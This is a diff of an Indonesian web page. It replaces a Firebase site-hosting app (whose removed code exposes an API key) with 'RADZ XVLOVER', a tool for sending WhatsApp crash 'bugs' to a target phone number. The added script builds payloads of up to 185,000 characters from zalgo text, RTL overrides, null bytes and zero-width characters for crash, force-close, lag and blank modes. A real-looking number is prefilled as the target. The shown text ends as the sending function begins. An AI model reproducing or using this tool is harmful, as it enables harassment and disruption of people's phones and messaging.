@@ -2,275 +2,668 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Radz Cloud - Final Enterprise</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>RADZ XVLOVER | GALAXY BUG | ORANGE EDITION</title>
     <style>
-        body { background: #020617; color: #f1f5f9; font-family: 'Inter', sans-serif; overflow-x: hidden; }
-        .glass { background: rgba(30, 41, 59, 0.6); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
-        .page { display: none; }
-        .active { display: block; animation: slideUp 0.4s ease-out; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-        .neon-blue { border: 1px solid rgba(59, 130, 246, 0.4); box-shadow: 0 0 20px rgba(59, 130, 246, 0.1); }
-        .modal-active { display: flex !important; animation: popUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); }
-        @keyframes popUp { from { opacity: 0; transform: scale(0.7); } to { opacity: 1; transform: scale(1); } }
-        .nav-active { color: #3b82f6 !important; transform: translateY(-5px); filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.5)); }
-        textarea::placeholder { color: rgba(59, 130, 246, 0.3); }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none; /* biar lebih mulus touch */
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 30%, #ff7b2c, #d94f00);
+            font-family: 'Poppins', 'Segoe UI', 'Montserrat', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+            transition: all 0.2s ease;
+        }
+
+        /* GALAXY ROTATING PLANETS BACKGROUND */
+        .galaxy-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .planet {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, #ffcc80, #ff9800);
+            box-shadow: 0 0 30px rgba(255,160,0,0.6);
+            animation: rotatePlanet linear infinite;
+            opacity: 0.5;
+        }
+        .ring {
+            position: absolute;
+            border-radius: 50%;
+            border: 2px solid rgba(255,200,100,0.6);
+            transform: rotate(20deg);
+            animation: spinRing 20s linear infinite;
+        }
+        @keyframes rotatePlanet {
+            from { transform: rotate(0deg) translateX(0px); }
+            to { transform: rotate(360deg) translateX(0px); }
+        }
+        @keyframes spinRing {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        /* bintang kecil tetap ada sedikit biar space feel */
+        .star {
+            position: absolute;
+            background: #fff9c4;
+            border-radius: 50%;
+            width: 2px;
+            height: 2px;
+            opacity: 0.8;
+            animation: twinkle 3s infinite alternate;
+        }
+        @keyframes twinkle {
+            0% { opacity: 0.2; transform: scale(1);}
+            100% { opacity: 1; transform: scale(1.3);}
+        }
+
+        /* LOADING SCREEN MODERN DENGAN BAR & PERSEN */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(145deg, #ff8c42, #e65c00);
+            backdrop-filter: blur(2px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.9s cubic-bezier(0.23, 1, 0.32, 1), visibility 0.9s;
+            font-family: 'Poppins', monospace;
+        }
+        .loading-screen.hide {
+            opacity: 0;
+            visibility: hidden;
+        }
+        .modern-loader {
+            width: 280px;
+            text-align: center;
+        }
+        .loader-title {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff3e0, #fff0c0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 35px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 8px #ffa500;
+        }
+        .progress-container {
+            background: rgba(0,0,0,0.4);
+            border-radius: 60px;
+            height: 14px;
+            width: 100%;
+            overflow: hidden;
+            backdrop-filter: blur(4px);
+            margin-bottom: 18px;
+            border: 1px solid #ffd8a0;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ffb347, #ff7e05);
+            border-radius: 60px;
+            transition: width 0.25s ease-out;
+            box-shadow: 0 0 10px #ffb347;
+        }
+        .percentage-text {
+            color: #fff0bd;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 12px;
+            text-shadow: 0 0 5px #e65c00;
+        }
+        .loading-sub {
+            color: #fff0ce;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+        .glow-text {
+            animation: glowPulse 1.2s ease infinite;
+        }
+        @keyframes glowPulse {
+            0% { text-shadow: 0 0 2px orange; opacity: 0.7;}
+            100% { text-shadow: 0 0 18px #ffbc6e; opacity: 1;}
+        }
+
+        /* MAIN CONTAINER TEMA ORANGE */
+        .glass-container {
+            position: relative;
+            z-index: 10;
+            background: rgba(0, 0, 0, 0.35);
+            backdrop-filter: blur(16px);
+            border-radius: 56px;
+            padding: 26px 24px;
+            max-width: 540px;
+            width: 100%;
+            border: 1px solid rgba(255, 140, 0, 0.7);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3), 0 0 0 2px rgba(255,165,0,0.2);
+            transition: transform 0.2s ease, box-shadow 0.2s;
+        }
+        .glass-container:active {
+            transform: scale(0.99);
+        }
+
+        /* profile */
+        .profile-orbit {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .profile-pic {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: 3px solid #ffa559;
+            object-fit: cover;
+            box-shadow: 0 0 20px #ff8c42;
+            transition: all 0.3s;
+        }
+        .profile-pic:hover {
+            transform: scale(1.03);
+            border-color: #ffce9e;
+        }
+        h1 {
+            font-size: 28px;
+            text-align: center;
+            background: linear-gradient(135deg, #ffbc6e, #ff8c42);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: 900;
+        }
+        .badge-orange {
+            background: #ff8c42aa;
+            backdrop-filter: blur(4px);
+            display: inline-block;
+            padding: 5px 16px;
+            border-radius: 80px;
+            font-size: 11px;
+            font-weight: bold;
+            color: #fff0c0;
+            margin-top: 6px;
+        }
+        .radz-status {
+            background: rgba(0,0,0,0.4);
+            border-radius: 60px;
+            padding: 10px 20px;
+            margin: 18px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-weight: bold;
+            color: #ffcf9a;
+            border: 1px solid #ff9f3d;
+            backdrop-filter: blur(8px);
+        }
+        .pulse-orange {
+            width: 14px;
+            height: 14px;
+            background: #ffa047;
+            border-radius: 50%;
+            animation: pulseOrange 1s infinite;
+        }
+        @keyframes pulseOrange {
+            0% { transform: scale(0.8); opacity: 0.6; box-shadow: 0 0 0 0 #ffa047;}
+            100% { transform: scale(1.2); opacity: 1; box-shadow: 0 0 10px 2px #ffa047;}
+        }
+        .input-group {
+            margin: 18px 0;
+        }
+        label {
+            font-weight: 600;
+            color: #ffcf9a;
+            margin-bottom: 8px;
+            display: block;
+            letter-spacing: 0.5px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 20px;
+            background: rgba(30,20,10,0.6);
+            border: 1px solid #ffaa55;
+            border-radius: 80px;
+            font-size: 16px;
+            color: #ffddbb;
+            transition: all 0.2s;
+            font-family: monospace;
+        }
+        input:focus {
+            outline: none;
+            border-color: #ffb347;
+            background: #2a1e0e;
+            box-shadow: 0 0 0 3px rgba(255,140,0,0.4);
+        }
+        .bug-menu {
+            background: rgba(0,0,0,0.35);
+            border-radius: 36px;
+            padding: 18px;
+            margin: 18px 0;
+            backdrop-filter: blur(4px);
+        }
+        .bug-title {
+            font-weight: bold;
+            text-align: center;
+            color: #ffb367;
+            margin-bottom: 15px;
+        }
+        .bug-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        .bug-btn {
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #ffa447;
+            color: #ffcf9a;
+            padding: 12px;
+            border-radius: 50px;
+            text-align: center;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        .bug-btn.active {
+            background: #ff8c42;
+            color: #2c1a07;
+            border-color: white;
+            box-shadow: 0 6px 14px rgba(255,100,0,0.4);
+            transform: scale(0.98);
+        }
+        .bug-btn:active {
+            transform: scale(0.94);
+        }
+        .send-btn {
+            width: 100%;
+            background: linear-gradient(100deg, #ffa047, #e65c00);
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 80px;
+            color: white;
+            margin: 20px 0 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 8px 18px #d95100;
+        }
+        .send-btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 8px #b54500;
+        }
+        .send-btn:disabled {
+            opacity: 0.6;
+            transform: none;
+        }
+        .log {
+            background: rgba(0,0,0,0.6);
+            border-radius: 28px;
+            padding: 14px;
+            font-size: 11px;
+            font-family: monospace;
+            color: #fdcc8a;
+            max-height: 150px;
+            overflow-y: auto;
+            border: 1px solid #ffaa55;
+            backdrop-filter: blur(4px);
+        }
+        footer {
+            text-align: center;
+            font-size: 9px;
+            color: #ffb978;
+            margin-top: 12px;
+        }
+        .emoji-row {
+            font-size: 24px;
+            text-align: center;
+            margin: 8px 0;
+            letter-spacing: 6px;
+        }
+        /* efek smooth scrolling */
+        html {
+            scroll-behavior: smooth;
+        }
     </style>
 </head>
-<body class="pb-32">
+<body>
 
-    <div id="result-modal" class="fixed inset-0 z-[100] bg-black/90 backdrop-blur-md hidden items-center justify-center p-6">
-        <div class="glass w-full max-w-xs p-8 rounded-[3rem] text-center neon-blue">
-            <div class="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-6 text-blue-500 text-3xl">
-                <i class="fas fa-rocket animate-bounce"></i>
-            </div>
-            <h3 class="text-2xl font-black mb-2 text-white italic">LIVE NOW!</h3>
-            <p class="text-[10px] text-gray-400 mb-8 uppercase tracking-widest font-bold">Project Berhasil Online</p>
+<!-- GALAXY BG with spinning planets & stars -->
+<div class="galaxy-bg" id="galaxyBg"></div>
+
+<!-- LOADING SCREEN MODERN -->
+<div class="loading-screen" id="loadingScreen">
+    <div class="modern-loader">
+        <div class="loader-title">RADZ XVLOVER</div>
+        <div class="percentage-text" id="loadingPercent">0%</div>
+        <div class="progress-container">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="loading-sub" id="loadingMsg">Memuat....</div>
+    </div>
+</div>
+
+<!-- MAIN CARD -->
+<div class="glass-container" id="mainContent" style="display: none;">
+    <div class="profile-orbit">
+        <img class="profile-pic" src="https://i.ibb.co.com/PvfpFZBf/fe76ca6b-0392-4cf9-8a8d-0088e2a81cd4.jpg" alt="radz profile">
+    </div>
+    <h1>RADZ XVLOVER</h1>
+    <div style="text-align: center; margin-top: 5px;">
+        <span class="badge-orange"> NOTE = TIDAK UNTUK DI SALAH GUNAKAN , GUNAKAN LAH KEPADA PENJAHAT</span>
+    </div>
+
+    <div class="radz-status">
+        <span class="pulse-orange"></span>
+        <span id="radzDynamicText">NYARI BUG? </span>
+        <span class="pulse-orange"></span>
+    </div>
+
+    <div class="input-group">
+        <label> NOMOR TARGET (62xxx)</label>
+        <input type="tel" id="nomor" placeholder="628993360673" value="628993360673">
+    </div>
+
+    <div class="bug-menu">
+        <div class="bug-title">PILIH MENU BUG </div>
+        <div class="bug-options">
+            <div class="bug-btn" data-bug="crash">CRASH </div>
+            <div class="bug-btn" data-bug="forceclose">FORCE CLOSE </div>
+            <div class="bug-btn" data-bug="delay">DELAY (LAG)</div>
+            <div class="bug-btn" data-bug="blank">BLANK GHOST</div>
+        </div>
+    </div>
+
+    <button class="send-btn" id="sendBtn">
+        <span>🪐</span> MENGIRIM 1000x BUG (1 JUTA KALI EFEK) <span>🌕</span>
+    </button>
+
+    <div class="log" id="log">
+        [✓] RADZ XVLOVER ENGINE GALAXY SIAP<br>
+        [✓] BUG POWER 1.000.000x ORANGE INFERNO<br>
+        [⚠] PASTIKAN WHATSAPP TERINSTALL
+    </div>
+    <div class="emoji-row">😈🗿🫵🏻🖕🏻🌞🔥</div>
+    <footer>⚠️ HANYA UNTUK TESTING DI NOMOR SENDIRI | PLANET ROTATING DAMAGE</footer>
+</div>
+
+<script>
+    // ====================== 1. LOADING BAR & PERSEN KEREN ==================
+    let progress = 0;
+    const loadingScreen = document.getElementById('loadingScreen');
+    const progressFill = document.getElementById('progressFill');
+    const percentSpan = document.getElementById('loadingPercent');
+    const loadingMsgSpan = document.getElementById('loadingMsg');
+    
+    const loadSteps = [
+        "Membangun galaxy orbit...", 
+        "Mengaktifkan mesin bug 1jtx", 
+        "Memproses profil Radz", 
+        "Siap meledakkan target 🌋"
+    ];
+    let stepIndex = 0;
+    
+    const intervalLoader = setInterval(() => {
+        if(progress < 100) {
+            progress += Math.floor(Math.random() * 8) + 2; // naik 2-10% tiap step
+            if(progress > 100) progress = 100;
+            progressFill.style.width = progress + '%';
+            percentSpan.innerText = progress + '%';
             
-            <div class="space-y-3">
-                <a id="link-tujuan" href="#" target="_blank" class="block w-full bg-blue-600 py-4 rounded-2xl font-black text-xs tracking-widest uppercase shadow-lg">BUKA SITUS</a>
-                <button onclick="copyLink()" class="w-full bg-white/5 border border-white/10 py-4 rounded-2xl font-black text-xs tracking-widest uppercase">SALIN LINK</button>
-            </div>
-            <button onclick="closeModal()" class="mt-8 text-[10px] font-bold text-gray-500 hover:text-white transition uppercase tracking-widest">Kembali</button>
-        </div>
-    </div>
-
-    <div class="max-w-md mx-auto p-5">
-        <header class="flex justify-between items-center py-8">
-            <div>
-                <h1 class="text-2xl font-black italic tracking-tighter text-white">RADZ<span class="text-blue-500">.HOST</span></h1>
-                <div class="flex items-center gap-2 mt-1">
-                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-ping"></span>
-                    <span class="text-[9px] font-bold text-slate-500 uppercase tracking-[0.2em]">Edge Node: Active</span>
-                </div>
-            </div>
-            <div class="glass px-5 py-3 rounded-2xl border-l-4 border-blue-500 neon-blue">
-                <p class="text-[8px] text-slate-400 font-bold uppercase tracking-widest">Balance</p>
-                <p id="balance-val" class="text-sm font-black text-white italic">Rp 0</p>
-            </div>
-        </header>
-
-        <div id="admin-notice" class="glass p-4 rounded-3xl mb-8 border-l-4 border-blue-600 hidden">
-            <div class="flex gap-4">
-                <i class="fas fa-satellite-dish text-blue-500 mt-1"></i>
-                <p id="notice-text" class="text-[11px] leading-relaxed text-slate-300 font-medium italic"></p>
-            </div>
-        </div>
-
-        <section id="home" class="page active">
-            <div class="glass p-8 rounded-[3rem] mb-10 relative overflow-hidden">
-                <div class="absolute -top-10 -right-10 w-32 h-32 bg-blue-600/10 rounded-full blur-3xl"></div>
-                <h2 class="text-lg font-black mb-6 flex items-center gap-3 italic">
-                    <i class="fas fa-code text-blue-500"></i> Deploy Site
-                </h2>
-                
-                <textarea id="code-input" placeholder="<html> ... </html>" 
-                    class="w-full h-64 bg-black/40 border border-slate-700/50 rounded-[2rem] p-6 text-xs font-mono text-blue-300 focus:border-blue-500 outline-none transition-all mb-6 shadow-inner"></textarea>
-                
-                <button onclick="deployNow()" id="btn-deploy"
-                    class="w-full bg-blue-600 hover:bg-blue-500 py-5 rounded-[1.8rem] font-black text-xs tracking-[0.3em] shadow-xl shadow-blue-900/40 active:scale-95 transition-all">
-                    LAUNCH TO CLOUD
-                </button>
-
-                <div id="p-box" class="hidden mt-10">
-                    <div class="flex justify-between items-center mb-3">
-                        <span id="p-status" class="text-[10px] font-bold text-slate-500 uppercase tracking-widest italic">Syncing...</span>
-                        <span id="p-percent" class="text-xs font-black text-blue-500">0%</span>
-                    </div>
-                    <div class="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
-                        <div id="p-bar" class="h-full bg-blue-500 shadow-[0_0_15px_#3b82f6] transition-all duration-300" style="width: 0%"></div>
-                    </div>
-                </div>
-            </div>
-
-            <h3 class="text-[10px] font-black text-slate-600 uppercase tracking-[0.4em] mb-6 ml-4">Deployment History</h3>
-            <div id="site-list" class="space-y-5">
-                </div>
-        </section>
-
-        <section id="wallet" class="page">
-            <div class="glass p-10 rounded-[3rem] text-center border-white/5">
-                <div class="w-24 h-24 bg-blue-600/10 rounded-[2rem] flex items-center justify-center mx-auto mb-6 border border-blue-500/20 shadow-inner">
-                    <i class="fas fa-wallet text-blue-500 text-4xl"></i>
-                </div>
-                <h2 class="text-2xl font-black italic">Refill Wallet</h2>
-                <p class="text-[10px] text-slate-500 mt-2 mb-10 font-bold uppercase tracking-widest">Tambah saldo akun Anda</p>
-                
-                <div class="grid grid-cols-2 gap-4">
-                    <button onclick="addCredit(5000)" class="glass p-5 rounded-2xl hover:bg-blue-500/10 font-black border border-white/5 transition-all active:scale-90">5K</button>
-                    <button onclick="addCredit(10000)" class="glass p-5 rounded-2xl hover:bg-blue-500/10 font-black border border-white/5 transition-all active:scale-90 text-blue-400">10K</button>
-                    <button onclick="addCredit(50000)" class="glass p-5 rounded-2xl hover:bg-blue-500/10 font-black border border-white/5 transition-all active:scale-90 text-blue-500">50K</button>
-                    <button onclick="addCredit(100000)" class="glass p-5 rounded-2xl hover:bg-blue-500/10 font-black border border-white/5 transition-all active:scale-90 text-indigo-500">100K</button>
-                </div>
-            </div>
-        </section>
-
-        <section id="profile" class="page">
-            <div class="glass p-10 rounded-[3rem] text-center border-white/5">
-                <div class="w-28 h-28 bg-gradient-to-tr from-blue-600 to-indigo-700 rounded-[2.5rem] mx-auto mb-6 flex items-center justify-center shadow-2xl">
-                    <span class="text-5xl font-black italic text-white">R</span>
-                </div>
-                <h2 class="text-2xl font-black italic">Radz Developer</h2>
-                <p id="user-id-text" class="text-[10px] text-slate-500 font-mono mt-2 mb-10 tracking-[0.2em] uppercase">ID: ---</p>
-                
-                <div class="space-y-4">
-                    <button class="w-full bg-slate-800/40 py-5 rounded-2xl text-[10px] font-black uppercase tracking-widest border border-slate-700 shadow-xl">Account Settings</button>
-                    <button onclick="location.reload()" class="w-full bg-red-500/10 text-red-500 py-5 rounded-2xl text-[10px] font-black uppercase tracking-widest border border-red-500/20">Sign Out</button>
-                </div>
-            </div>
-        </section>
-    </div>
-
-    <nav class="fixed bottom-8 left-8 right-8 h-20 glass rounded-[2.5rem] flex items-center justify-around px-6 z-50 neon-blue border-white/5">
-        <button onclick="switchTab('home', this)" class="nav-btn nav-active text-slate-500 flex flex-col items-center gap-1">
-            <i class="fas fa-rocket text-xl"></i><span class="text-[8px] font-black uppercase">Home</span>
-        </button>
-        <button onclick="switchTab('wallet', this)" class="nav-btn text-slate-500 flex flex-col items-center gap-1">
-            <i class="fas fa-wallet text-xl"></i><span class="text-[8px] font-black uppercase">Wallet</span>
-        </button>
-        <button onclick="switchTab('profile', this)" class="nav-btn text-slate-500 flex flex-col items-center gap-1">
-            <i class="fas fa-user-ninja text-xl"></i><span class="text-[8px] font-black uppercase">Radz</span>
-        </button>
-    </nav>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, set, onValue, get, update, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-        import { getStorage, ref as sRef, uploadString, getDownloadURL, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
-
-        // CONFIG FIREBASE RADZ
-        const firebaseConfig = {
-            apiKey: "AIzaSyCHr0eemIkfHNFDUkSaFDklp_c1OgmSnl8",
-            authDomain: "mybro-9ba5f.firebaseapp.com",
-            databaseURL: "https://mybro-9ba5f-default-rtdb.firebaseio.com/",
-            projectId: "mybro-9ba5f",
-            storageBucket: "mybro-9ba5f.appspot.com"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        const storage = getStorage(app);
-
-        let myID = localStorage.getItem('radz_id') || "RADZ-" + Math.floor(1000 + Math.random() * 8999);
-        localStorage.setItem('radz_id', myID);
-        document.getElementById('user-id-text').innerText = "ID: " + myID;
-
-        // --- TAB ENGINE ---
-        window.switchTab = (id, el) => {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('nav-active'));
-            el.classList.add('nav-active');
-        };
-
-        // --- SYNC DATA SALDO & ADMIN ---
-        onValue(ref(db, `users/${myID}/profile`), (snap) => {
-            if (!snap.exists()) set(ref(db, `users/${myID}/profile`), { balance: 5000 });
-            else document.getElementById('balance-val').innerText = "Rp " + snap.val().balance.toLocaleString();
-        });
-
-        onValue(ref(db, `admin/announcement`), (snap) => {
-            const box = document.getElementById('admin-notice');
-            if (snap.exists() && snap.val() !== "") {
-                box.classList.remove('hidden');
-                document.getElementById('notice-text').innerText = snap.val();
+            if(progress >= 30 && stepIndex === 0) {
+                loadingMsgSpan.innerText = loadSteps[1];
+                stepIndex++;
+            } else if(progress >= 60 && stepIndex === 1) {
+                loadingMsgSpan.innerText = loadSteps[2];
+                stepIndex++;
+            } else if(progress >= 85 && stepIndex === 2) {
+                loadingMsgSpan.innerText = loadSteps[3];
+                stepIndex++;
             }
-        });
-
-        // --- DEPLOY ENGINE (BENERAN BERFUNGSI) ---
-        window.deployNow = async () => {
-            const htmlCode = document.getElementById('code-input').value;
-            if (!htmlCode.trim()) return alert("Mana kodenya, Radz?!");
-
-            const biaya = 1000;
-            const snap = await get(ref(db, `users/${myID}/profile`));
-            const currentBal = snap.val().balance || 0;
-
-            if (currentBal < biaya) return alert("Saldo Kurang! Top Up dulu sana.");
-
-            // Jalankan UI Progress
-            const pBox = document.getElementById('p-box');
-            const pBar = document.getElementById('p-bar');
-            const pPercent = document.getElementById('p-percent');
-            pBox.classList.remove('hidden');
-
-            // Bikin file blob asli
-            const blob = new Blob([htmlCode], { type: 'text/html' });
-            const fileName = `index_${Date.now()}.html`;
-            const storagePath = sRef(storage, `hosted/${myID}/${fileName}`);
-
-            const uploadTask = uploadBytesResumable(storagePath, blob);
-
-            uploadTask.on('state_changed', 
-                (sn) => {
-                    const p = (sn.bytesTransferred / sn.totalBytes) * 100;
-                    pBar.style.width = p + "%";
-                    pPercent.innerText = Math.round(p) + "%";
-                }, 
-                (err) => alert("Upload Error: " + err.message), 
-                async () => {
-                    // BERHASIL: Ambil URL Publik
-                    const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
-                    
-                    // Potong Saldo & Simpan Database
-                    await update(ref(db, `users/${myID}/profile`), { balance: currentBal - biaya });
-                    await push(ref(db, `users/${myID}/deployed`), {
-                        name: "Web_" + Date.now().toString().slice(-4),
-                        url: downloadURL,
-                        time: Date.now()
-                    });
-
-                    // Reset UI & Tampilkan Popup
-                    pBox.classList.add('hidden');
-                    document.getElementById('code-input').value = "";
-                    openModal(downloadURL);
-                }
-            );
-        };
-
-        // --- MODAL ENGINE ---
-        function openModal(url) {
-            document.getElementById('link-tujuan').href = url;
-            document.getElementById('result-modal').classList.add('modal-active');
+            
+            if(progress === 100) {
+                clearInterval(intervalLoader);
+                setTimeout(() => {
+                    loadingScreen.classList.add('hide');
+                    setTimeout(() => {
+                        loadingScreen.style.display = 'none';
+                        document.getElementById('mainContent').style.display = 'block';
+                        generateGalaxyPlanets(5);  // planet bergerak
+                        generateStars(150);
+                    }, 800);
+                }, 400);
+            }
         }
-        window.closeModal = () => document.getElementById('result-modal').classList.remove('modal-active');
-        window.copyLink = () => {
-            const url = document.getElementById('link-tujuan').href;
-            navigator.clipboard.writeText(url);
-            alert("Link Berhasil Disalin!");
-        };
-
-        // --- RENDER LIST RIWAYAT ---
-        onValue(ref(db, `users/${myID}/deployed`), (snap) => {
-            const list = document.getElementById('site-list');
-            list.innerHTML = "";
-            if (snap.exists()) {
-                Object.values(snap.val()).reverse().forEach(site => {
-                    const d = document.createElement('div');
-                    d.className = "glass p-5 rounded-[2rem] flex justify-between items-center group hover:border-blue-500/50 transition-all";
-                    d.innerHTML = `
-                        <div class="flex items-center gap-4">
-                            <div class="w-10 h-10 bg-blue-500/10 rounded-xl flex items-center justify-center text-blue-500"><i class="fas fa-globe-asia text-xs"></i></div>
-                            <div>
-                                <p class="text-[11px] font-black text-white italic">${site.name}</p>
-                                <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest">${new Date(site.time).toLocaleDateString()}</p>
-                            </div>
-                        </div>
-                        <a href="${site.url}" target="_blank" class="bg-blue-600 hover:bg-blue-500 px-5 py-2.5 rounded-xl text-[9px] font-black shadow-lg transition-all">OPEN</a>
-                    `;
-                    list.appendChild(d);
-                });
-            } else {
-                list.innerHTML = `<p class="text-center text-slate-600 text-[10px] font-black uppercase tracking-[0.3em] py-10 italic">No Domains Registered</p>`;
+    }, 110);
+    
+    // =============== GALAXY PLANET BERPUSAR IDEMU =================
+    function generateGalaxyPlanets(count) {
+        const container = document.getElementById('galaxyBg');
+        container.innerHTML = '';
+        const planetColors = ['#ffaa55','#ff8733','#ffb347','#ff9f4a','#e67e22'];
+        for(let i=0; i<count; i++) {
+            let planet = document.createElement('div');
+            let size = 45 + Math.random() * 70;
+            planet.classList.add('planet');
+            planet.style.width = size + 'px';
+            planet.style.height = size + 'px';
+            planet.style.left = Math.random() * 85 + '%';
+            planet.style.top = Math.random() * 80 + '%';
+            planet.style.background = `radial-gradient(circle, ${planetColors[i%planetColors.length]}, #b95300)`;
+            planet.style.animationDuration = 18 + Math.random() * 25 + 's';
+            planet.style.animationName = 'rotatePlanet';
+            planet.style.opacity = 0.5 + Math.random() * 0.3;
+            
+            // ring untuk planet tertentu
+            if(i % 2 === 0) {
+                let ring = document.createElement('div');
+                ring.classList.add('ring');
+                ring.style.width = (size+18) + 'px';
+                ring.style.height = (size+12) + 'px';
+                ring.style.left = '50%';
+                ring.style.top = '50%';
+                ring.style.transform = 'translate(-50%, -50%) rotate(25deg)';
+                ring.style.borderWidth = '2px';
+                ring.style.borderColor = '#ffc285';
+                planet.appendChild(ring);
             }
+            container.appendChild(planet);
+        }
+        // tambah asteroid / bintang gerak tipis
+        for(let i=0;i<80;i++) {
+            let star = document.createElement('div');
+            star.classList.add('star');
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.width = 2 + Math.random() * 4 + 'px';
+            star.style.height = star.style.width;
+            star.style.animationDuration = 2 + Math.random() * 5 + 's';
+            container.appendChild(star);
+        }
+    }
+    
+    function generateStars(amount) {
+        const container = document.getElementById('galaxyBg');
+        for(let i=0;i<amount;i++) {
+            let star = document.createElement('div');
+            star.classList.add('star');
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.width = 1 + Math.random() * 3 + 'px';
+            star.style.animationDelay = Math.random() * 4 + 's';
+            container.appendChild(star);
+        }
+    }
+    
+    // ================== BUG ENGINE 1 JUTA KALI LIPAT =================
+    let selectedBug = "crash";
+    let isSending = false;
+    
+    document.querySelectorAll('.bug-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.bug-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            selectedBug = btn.getAttribute('data-bug');
+            addLog(`🪐 BUG MODE: ${selectedBug.toUpperCase()} (1 JUTA KALI LIPAT GALAXY)`, false);
+            document.getElementById('radzDynamicText').innerHTML = `BUG ${selectedBug.toUpperCase()} SIAP`;
         });
-
-        window.addCredit = async (val) => {
-            const snap = await get(ref(db, `users/${myID}/profile`));
-            await update(ref(db, `users/${myID}/profile`), { balance: (snap.val().balance || 0) + val });
-        };
-    </script>
+    });
+    document.querySelector('.bug-btn[data-bug="crash"]').classList.add('active');
+    
+    function addLog(msg, isError = false) {
+        const logDiv = document.getElementById('log');
+        const color = isError ? '#ffaa88' : '#ffcf9a';
+        logDiv.innerHTML += `<div style="color:${color}; margin-top:5px;">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+    
+    // Payload raksasa 180k karakter + kombinasi berbahaya
+    function getUltraPayload(type) {
+        let baseCrash = "💀💀".repeat(8000) + "Z̸̢̨̡̢".repeat(6000) + "%00%00".repeat(4000) + "‮⁦⁩".repeat(5000);
+        let overflow = "X".repeat(45000);
+        let nullAttack = "%00".repeat(7500);
+        let rtlMass = "%E2%80%AE%E2%80%AD".repeat(5000);
+        let zalgoHell = "H̷̨̢̡̢̡̢̡̢̡̢̡".repeat(15000);
+        switch(type) {
+            case 'crash':
+                return (rtlMass + baseCrash + nullAttack + zalgoHell + overflow).substring(0, 185000);
+            case 'forceclose':
+                return ("%F0%9F%98%81".repeat(30000) + "%00%00❌".repeat(18000) + "FORCECLOSE").substring(0, 185000);
+            case 'delay':
+                return ("🕳️⏳🕳️".repeat(50000) + ".".repeat(80000)).substring(0, 185000);
+            case 'blank':
+                return ("%E2%80%8B".repeat(70000) + "%E2%81%A0".repeat(70000)).substring(0, 185000);
+            default:
+                return overflow + nullAttack;
+        }
+    }
+    
+    async function sendMassiveBug() {
+        if(isSending) {
+            addLog("⚠️ SABAR, SERANGAN MASIH BERLANGSUNG!", true);
+            return;
+        }
